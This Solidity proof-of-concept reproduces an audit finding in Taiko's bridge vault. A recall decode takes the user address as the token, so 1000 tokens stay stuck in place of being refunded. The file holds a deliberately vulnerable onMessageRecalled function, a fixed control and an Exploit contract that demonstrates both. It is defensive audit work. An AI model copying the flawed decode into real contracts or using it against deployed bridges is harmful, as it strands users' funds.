// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Taiko — onMessageRecalled binds `token` to the user argument
    (Sigma Prime, finding 35998).
    receiveToken is encoded as (ctoken, user, to, amount). The recall decode
    takes the second word as the token. That word is the user, so the vault
    does not refund the real token. 1000 stays in the vault. The control
    reads CanonicalERC20.addr and pays the 1000. */

contract Asset {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Vault {
    struct CanonicalERC20 {
        address addr;
        uint256 chainId;
    }

    Asset public real;
    address public srcOwner;
    address public decoded;
    uint256 public refunded;
    uint256 public lost;

    constructor(Asset real_, address srcOwner_) {
        real = real_;
        srcOwner = srcOwner_;
    }

    function receiveToken(CanonicalERC20 calldata, address, address, uint256) external pure {}

    function onMessageRecalled(bytes calldata messageData) external {
        address token;
        uint256 amount;
        (, token,, amount) = abi.decode(messageData[4:], (CanonicalERC20, address, address, uint256));
        // @> VULN: token is the user, so the real token amount is not refunded
        decoded = token;
        if (token == address(real)) {
            require(real.transfer(srcOwner, amount), "pay");
            refunded = amount;
        }
        lost = amount - refunded;
    }

    function onMessageRecalledFixed(bytes calldata messageData) external {
        CanonicalERC20 memory ctoken;
        uint256 amount;
        (ctoken,,, amount) = abi.decode(messageData[4:], (CanonicalERC20, address, address, uint256));
        address token = ctoken.addr;
        require(token == address(real), "token");
        require(real.transfer(srcOwner, amount), "pay");
        refunded = amount;
        lost = 0;
    }
}

contract Exploit {
    uint256 public constant N = 1_000 ether;

    Asset public token;
    Vault public vault;
    address public decoded;
    uint256 public lost;
    uint256 public stuck;
    uint256 public controlPaid;

    constructor() {
        token = new Asset();
        vault = new Vault(token, address(this));
    }

    function payload() public view returns (bytes memory) {
        return abi.encodeWithSelector(
            vault.receiveToken.selector,
            Vault.CanonicalERC20({addr: address(token), chainId: 1}),
            address(this),
            address(this),
            N
        );
    }

    function run() external {
        token.mint(address(vault), N);
        vault.onMessageRecalled(payload());
        decoded = vault.decoded();
        lost = vault.lost();
        stuck = token.balanceOf(address(vault));
        require(decoded == address(this), "user");
        require(decoded != address(token), "not token");
        require(vault.refunded() == 0, "refund");
        require(lost == N, "lost");
        require(stuck == N, "stuck");
        require(token.balanceOf(address(this)) == 0, "user balance");
    }

    function runControl() external {
        token.mint(address(vault), N);
        vault.onMessageRecalledFixed(payload());
        controlPaid = token.balanceOf(address(this));
        require(controlPaid == N, "paid");
        require(token.balanceOf(address(vault)) == 0, "empty");
        require(vault.refunded() == N, "refunded");
    }
}
